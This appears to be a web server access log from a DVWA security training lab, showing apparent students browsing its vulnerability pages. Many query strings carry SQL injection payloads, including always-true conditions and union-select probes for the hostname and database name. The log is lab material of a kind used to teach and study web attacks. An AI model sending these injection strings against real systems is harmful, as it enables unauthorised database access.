211.219.10.204 - - [08/Jul/2024:07:29:53 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:29:54 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:29:51 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1910 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:29:55 +0000] "GET /vulnerabilities/sqli_blind/ HTTP/1.1" 200 1774 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:29:55 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:29:56 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:29:57 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:29:57 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1771 "http://lecture.devsmile.com:9090/vulnerabilities/sqli_blind/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:29:57 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1902 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:30:03 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:30:04 +0000] "GET /vulnerabilities/sqli/?id=admin&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
127.0.0.1 - - [08/Jul/2024:07:30:07 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
211.219.10.253 - - [08/Jul/2024:07:30:11 +0000] "GET /vulnerabilities/sqli/?id=my1108.jung&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:30:10 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1913 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:30:18 +0000] "GET /vulnerabilities/sqli/?id=user&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=admin&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:30:19 +0000] "GET /vulnerabilities/sqli/?id=sy0819.lee&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=my1108.jung&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:30:34 +0000] "GET /vulnerabilities/sqli/?id=aaa%27+or+1%3D1%3B&Submit=Submit HTTP/1.1" 200 503 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:30:39 +0000] "POST /login.php HTTP/1.1" 302 337 "http://lecture.devsmile.com:9090/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:30:39 +0000] "GET /login.php HTTP/1.1" 200 1065 "http://lecture.devsmile.com:9090/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:30:44 +0000] "-" 408 0 "-" "-"
127.0.0.1 - - [08/Jul/2024:07:30:47 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
127.0.0.1 - - [08/Jul/2024:07:30:48 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
211.219.10.253 - - [08/Jul/2024:07:30:49 +0000] "GET /vulnerabilities/sqli/?id=admin%40&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=user&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:30:54 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1902 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:31:00 +0000] "GET /vulnerabilities/sqli/?id=%27+select+*+from+dual&Submit=Submit HTTP/1.1" 200 516 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:31:10 +0000] "GET /vulnerabilities/sqli/?id=+select+*+from+dual&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:31:15 +0000] "GET /vulnerabilities/sqli/?id=&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=sy0819.lee&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:31:22 +0000] "GET /vulnerabilities/sqli/?id=hgmoon26&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:31:39 +0000] "GET /vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27+%23&Submit=Submit HTTP/1.1" 200 1854 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=hgmoon26&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:32:01 +0000] "-" 408 0 "-" "-"
211.219.10.204 - - [08/Jul/2024:07:32:24 +0000] "GET /vulnerabilities/exec/ HTTP/1.1" 200 1776 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:24 +0000] "GET /vulnerabilities/csrf/ HTTP/1.1" 200 1822 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:32:26 +0000] "GET /vulnerabilities/sqli/?id=1%27or%271%27%3D%271%27+%23&Submit=Submit HTTP/1.1" 200 1854 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=admin%40&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:32:26 +0000] "GET /vulnerabilities/exec/ HTTP/1.1" 200 1775 "http://lecture.devsmile.com:9090/vulnerabilities/csrf/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:30 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1804 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:30 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1808 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:33 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1964 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:36 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1807 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:37 +0000] "GET /vulnerabilities/sqli/?id=10&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:39 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1962 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:51 +0000] "GET /vulnerabilities/upload/ HTTP/1.1" 200 1804 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:53 +0000] "GET /vulnerabilities/sqli/ HTTP/1.1" 200 1830 "http://lecture.devsmile.com:9090/vulnerabilities/upload/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:55 +0000] "GET /vulnerabilities/sqli_blind/ HTTP/1.1" 200 1834 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:55 +0000] "GET /vulnerabilities/weak_id/ HTTP/1.1" 200 1534 "http://lecture.devsmile.com:9090/vulnerabilities/sqli_blind/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:58 +0000] "GET /vulnerabilities/exec/ HTTP/1.1" 200 1775 "http://lecture.devsmile.com:9090/vulnerabilities/weak_id/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:32:59 +0000] "GET /vulnerabilities/sqli/?id=1%27+or+%271%27%3D%271%27+%23&Submit=Submit HTTP/1.1" 200 1856 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=10&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:33:19 +0000] "GET /vulnerabilities/sqli/?id=admin+admin&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=1%27or%271%27%3D%271%27+%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:33:23 +0000] "GET /vulnerabilities/sqli/?id=%271%27+or+1++%3D+1+%23&Submit=Submit HTTP/1.1" 200 514 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:33:27 +0000] "GET /vulnerabilities/sqli/?id=admin_admin&Submit=Submit HTTP/1.1" 200 1772 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=admin+admin&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:33:31 +0000] "GET /vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27+%23&Submit=Submit HTTP/1.1" 200 1854 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:33:40 +0000] "GET /vulnerabilities/sqli/?id=%271%27+or+%271+%27+%3D+%271%27+%23&Submit=Submit HTTP/1.1" 200 514 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:33:50 +0000] "-" 408 0 "-" "-"
211.219.10.253 - - [08/Jul/2024:07:33:57 +0000] "GET /vulnerabilities/sqli/?id=1%27+or+%271+%27+%3D+%271%27+%23&Submit=Submit HTTP/1.1" 200 1857 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:34:06 +0000] "GET /vulnerabilities/sqli/?id=1%27+or+1++%3D+1+%23&Submit=Submit HTTP/1.1" 200 1854 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=1%27+or+%271+%27+%3D+%271%27+%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:34:28 +0000] "GET /vulnerabilities/sqli/?id=%27+uniom+select+%40hostname%2C+database%28%29%23&Submit=Submit HTTP/1.1" 200 528 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27+%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:34:28 +0000] "GET /vulnerabilities/sqli/?id=%27+union+select+%40%40hostname%2C+database%28%29%23&Submit=Submit HTTP/1.1" 200 1833 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=1%27+or+%271%27%3D%271%27+%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:34:37 +0000] "GET /vulnerabilities/sqli/?id=%27+uniom+select+%40%40hostname%2C+database%28%29%23&Submit=Submit HTTP/1.1" 200 529 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27+%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:34:53 +0000] "GET /vulnerabilities/sqli/?id=%27+union+select+%40%40hostname%2C+database%28%29%23&Submit=Submit HTTP/1.1" 200 1833 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=1%27+or+%271%27+%3D+%271%27+%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:35:20 +0000] "-" 408 0 "-" "-"
211.219.10.204 - - [08/Jul/2024:07:35:45 +0000] "GET / HTTP/1.1" 200 3012 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:36:32 +0000] "GET /vulnerabilities/xss_s/ HTTP/1.1" 200 1976 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=%27+union+select+%40%40hostname%2C+database%28%29%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:36:38 +0000] "GET /vulnerabilities/xss_s/ HTTP/1.1" 200 1976 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=%27+union+select+%40%40hostname%2C+database%28%29%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:36:54 +0000] "POST /vulnerabilities/xss_s/ HTTP/1.1" 200 1990 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:36:57 +0000] "POST /vulnerabilities/xss_s/ HTTP/1.1" 200 1995 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:36:57 +0000] "GET /vulnerabilities/xss_s/ HTTP/1.1" 200 1995 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=admin_admin&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:36:58 +0000] "GET /vulnerabilities/xss_s/ HTTP/1.1" 200 1995 "http://lecture.devsmile.com:9090/vulnerabilities/sqli/?id=1%27+or+1++%3D+1+%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:37:44 +0000] "POST /vulnerabilities/xss_s/ HTTP/1.1" 200 2017 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:37:50 +0000] "GET /vulnerabilities/xss_r/ HTTP/1.1" 200 1753 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:37:52 +0000] "GET /vulnerabilities/xss_s/ HTTP/1.1" 200 2016 "http://lecture.devsmile.com:9090/vulnerabilities/xss_r/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:37:54 +0000] "POST /vulnerabilities/xss_s/ HTTP/1.1" 200 2027 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:37:58 +0000] "GET /vulnerabilities/xss_s/ HTTP/1.1" 200 2027 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:38:00 +0000] "GET /vulnerabilities/xss_s/ HTTP/1.1" 200 2027 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:38:06 +0000] "POST /vulnerabilities/xss_s/ HTTP/1.1" 200 2036 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:38:34 +0000] "POST /vulnerabilities/xss_s/ HTTP/1.1" 200 2045 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:38:42 +0000] "-" 408 0 "-" "-"
211.219.10.253 - - [08/Jul/2024:07:38:44 +0000] "GET / HTTP/1.1" 200 3011 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:38:46 +0000] "GET /vulnerabilities/xss_s/ HTTP/1.1" 200 2044 "http://lecture.devsmile.com:9090/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:38:52 +0000] "GET / HTTP/1.1" 200 3011 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:38:57 +0000] "GET /vulnerabilities/xss_d/ HTTP/1.1" 200 1907 "http://lecture.devsmile.com:9090/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:38:58 +0000] "GET /vulnerabilities/xss_r/ HTTP/1.1" 200 1752 "http://lecture.devsmile.com:9090/vulnerabilities/xss_d/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:46:07 +0000] "GET /vulnerabilities/csrf/ HTTP/1.1" 200 1752 "http://lecture.devsmile.com:9090/vulnerabilities/xss_s/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:49:10 +0000] "POST /login.php HTTP/1.1" 302 337 "http://lecture.devsmile.com:9090/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:49:10 +0000] "GET /index.php HTTP/1.1" 200 3036 "http://lecture.devsmile.com:9090/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:49:11 +0000] "GET /dvwa/css/main.css HTTP/1.1" 200 1445 "http://lecture.devsmile.com:9090/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:49:11 +0000] "GET /dvwa/js/dvwaPage.js HTTP/1.1" 200 816 "http://lecture.devsmile.com:9090/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:49:11 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5331 "http://lecture.devsmile.com:9090/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
